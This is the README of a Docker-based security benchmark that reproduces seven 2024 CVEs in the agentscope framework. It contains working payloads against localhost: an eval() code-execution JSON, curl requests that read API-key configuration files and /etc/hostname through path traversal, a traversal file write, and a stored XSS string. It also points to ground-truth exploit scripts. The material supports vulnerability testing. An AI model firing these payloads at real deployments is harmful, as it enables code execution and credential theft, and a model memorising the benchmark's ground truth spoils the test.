# agentscope Security Benchmark

Docker-based security testing for agentscope, following `autogpt-security-bench` structure.

## Structure

```
agentscope-security-bench/
├── runtimes/
│   ├── agentscope-0.0.4/  # Runtime for v0.1.1
│   └── agentscope-0.1.1/  # Runtime for v0.1.1
└── tasks/
    ├── task-cve-2024-48050-rce-eval/
    ├── task-cve-2024-8501-arbitrary-file-download/
    ├── task-cve-2024-8524-directory-traversal/
    ├── task-cve-2024-8537-path-traversal-delete/
    ├── task-cve-2024-8550-lfi-workflow/
    ├── task-cve-2024-8551-path-traversal/
    └── task-cve-2024-8556-stored-xss/
```

## Available Tests

### CVE-2024-48050: RCE via eval() (v0.1.1)
- **Type**: Unauthenticated Remote Code Execution
- **Severity**: CRITICAL (CVSS 9.8)
- **Run**: `tasks/task-cve-2024-48050-rce-eval/ground_truth_exploit.sh`

The `is_callable_expression` function in `agentscope/web/workstation/workflow_utils.py` uses `eval()` on user-controlled input without sanitization. Malicious workflow data payloads with crafted `condition_func` parameters can execute arbitrary Python code.

### CVE-2024-8501: Arbitrary File Download via RPC Agent (v0.1.1)
- **Type**: Arbitrary File Download / Unauthorized File Access
- **Severity**: HIGH
- **Run**: `tasks/task-cve-2024-8501-arbitrary-file-download/ground_truth_exploit.sh`

The RPC agent's `download_file()` method (`rpc_agent_client.py:318`) accepts any file path without validation, allowing attackers to download arbitrary files from the RPC server's filesystem, including `/etc/passwd`, configuration files, API keys, and credentials.

### CVE-2024-8524: Directory Traversal in /read-examples (v0.1.1)
- **Type**: Directory Traversal / Arbitrary JSON File Read
- **Severity**: HIGH
- **Run**: `tasks/task-cve-2024-8524-directory-traversal/ground_truth_exploit.sh`

The `/read-examples` endpoint (`_app.py:642`) lacks proper path validation on the `data` parameter, allowing attackers to read arbitrary JSON files using directory traversal sequences (`../`) or absolute paths.

### CVE-2024-8537: Path Traversal Leading to Arbitrary File Deletion (v0.1.1)
- **Type**: Path Traversal / Arbitrary File Deletion
- **Severity**: HIGH
- **Run**: `tasks/task-cve-2024-8537-path-traversal-delete/ground_truth_exploit.sh`

The `/delete-workflow` endpoint lacks proper path validation, allowing attackers to use path traversal sequences (`../`) to delete arbitrary files outside the intended workflow directory, potentially causing denial of service or enabling further exploitation.

### CVE-2024-8550: LFI in load-workflow Endpoint (v0.1.1)
- **Type**: Local File Inclusion / Arbitrary File Read
- **Severity**: HIGH (CVSS 7.5)
- **Run**: `tasks/task-cve-2024-8550-lfi-workflow/ground_truth_exploit.sh`

The `/load-workflow` endpoint uses `os.path.join()` without validating the filename parameter. Python's `os.path.join()` behavior with absolute paths allows bypassing the intended directory restriction, enabling arbitrary JSON file reads including API keys and configuration files.

### CVE-2024-8551: Path Traversal in Workflow API (v0.1.1)
- **Type**: Path Traversal / Arbitrary File Read/Write
- **Severity**: HIGH (CVSS 7.5)
- **Run**: `tasks/task-cve-2024-8551-path-traversal/ground_truth_exploit.sh`

The `/save-workflow` and `/load-workflow` API endpoints fail to sanitize the `filename` parameter, allowing attackers to read or write arbitrary JSON files using path traversal sequences (`../`).

### CVE-2024-8556: Stored XSS via run ID (v0.1.1)
- **Type**: Stored Cross-Site Scripting
- **Severity**: HIGH (CVSS 7.1)
- **Run**: `tasks/task-cve-2024-8556-stored-xss/ground_truth_exploit.sh`

The AgentScope Studio web UI renders user-controlled run IDs without sanitization in the dashboard. Malicious run IDs registered via `/api/runs/register` are stored and execute JavaScript when viewing run details in the browser.

## Quick Start

```bash
# Test CVE-2024-48050 (RCE via eval)
cd tasks/task-cve-2024-48050-rce-eval
./ground_truth_exploit.sh

# Test CVE-2024-8501 (Arbitrary File Download via RPC)
cd tasks/task-cve-2024-8501-arbitrary-file-download
./ground_truth_exploit.sh

# Test CVE-2024-8524 (Directory Traversal in /read-examples)
cd tasks/task-cve-2024-8524-directory-traversal
./ground_truth_exploit.sh

# Test CVE-2024-8537 (Path Traversal File Deletion)
cd tasks/task-cve-2024-8537-path-traversal-delete
./ground_truth_exploit.sh

# Test CVE-2024-8550 (LFI in load-workflow)
cd tasks/task-cve-2024-8550-lfi-workflow
./ground_truth_exploit.sh

# Test CVE-2024-8551 (Path Traversal)
cd tasks/task-cve-2024-8551-path-traversal
./ground_truth_exploit.sh

# Test CVE-2024-8556 (Stored XSS)
cd tasks/task-cve-2024-8556-stored-xss
./ground_truth_exploit.sh
```

## Design

Follows `autogpt-security-bench` patterns:
- ✅ Docker-based isolation
- ✅ Self-contained runtimes with source code
- ✅ ground_truth_exploit.sh for complete execution
- ✅ verify.sh for checking results
- ✅ Structured task metadata (task.yaml)

## Attack Vector Example

```json
{
  "data": {
    "3": {
      "data": {
        "args": {
          "condition_func": "__import__('os').system('touch /tmp/pwned')"
        },
        "elements": ["4"]
      },
      "name": "WhileLoopPipeline"
    }
  }
}
```

## Attack Vector Examples

### CVE-2024-48050: RCE Payload

```json
{
  "data": {
    "3": {
      "data": {
        "args": {
          "condition_func": "__import__('os').system('touch /tmp/pwned')"
        },
        "elements": ["4"]
      },
      "name": "WhileLoopPipeline"
    }
  }
}
```

### CVE-2024-8550: LFI Payload

```bash
# Read arbitrary JSON file via absolute path
curl -X POST http://localhost:5000/load-workflow \
  -H 'Content-Type: application/json' \
  -d '{
    "filename": "/etc/config.json"
  }'

# Read API keys from config
curl -X POST http://localhost:5000/load-workflow \
  -H 'Content-Type: application/json' \
  -d '{
    "filename": "/home/user/.agentscope/model_config.json"
  }'
```

### CVE-2024-8551: Path Traversal Payload

```bash
# Write arbitrary file
curl -X POST http://localhost:5000/save-workflow \
  -H 'Content-Type: application/json' \
  -d '{
    "filename": "../../../../../tmp/pwned",
    "workflow": "{\"malicious\": \"data\"}",
    "overwrite": true
  }'

# Read arbitrary file
curl -X POST http://localhost:5000/load-workflow \
  -H 'Content-Type: application/json' \
  -d '{
    "filename": "../../../../../etc/hostname"
  }'
```

### CVE-2024-8556: XSS Payload

```bash
curl -X POST http://localhost:5000/api/runs/register \
  -H 'Content-Type: application/json' \
  -d '{
    "run_id": "<img src=q onerror=alert(1)>",
    "project": "test",
    "name": "xss_test",
    "timestamp": "2024-01-01 12:00:00",
    "run_dir": "test",
    "pid": 12345
  }'
```

## References

- [CVE-2024-48050 Details](https://rumbling-slice-eb0.notion.site/Unauthenticated-Remote-Code-Execution-via-The-use-of-eval-in-is_callable_expression-and-sanitize_nod-cd4ea6c576da4e0b965ef596855c298d)
- CVE-2024-8550: LFI in /load-workflow endpoint
- CVE-2024-8551: Path Traversal in save-workflow/load-workflow
- CVE-2024-8556: Stored XSS via run ID
- Discoverer: Aftersnows (CVE-2024-48050)
